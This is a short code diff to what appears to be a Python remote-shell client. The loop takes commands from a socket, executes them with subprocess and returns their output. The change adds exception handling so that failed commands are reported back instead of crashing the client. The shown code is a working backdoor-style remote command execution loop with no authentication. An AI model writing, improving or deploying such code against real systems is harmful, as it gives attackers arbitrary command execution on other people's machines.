@@ -15,8 +15,11 @@ while True:
     cmd_raw = s.recv(1024)
     cmd = cmd_raw.decode("utf-8")
 
-    response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
-    if not response.stdout:
-        s.send(bytes("done", "utf-8"))
-    else:
-        s.send(response.stdout)  # Response is already a bytes object
+    try:
+        response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
+        if not response.stdout:
+            s.send(bytes("done", "utf-8"))
+        else:
+            s.send(response.stdout)  # Response is already a bytes object
+    except:
+        s.send(bytes("Command failed client-side", "utf-8"))
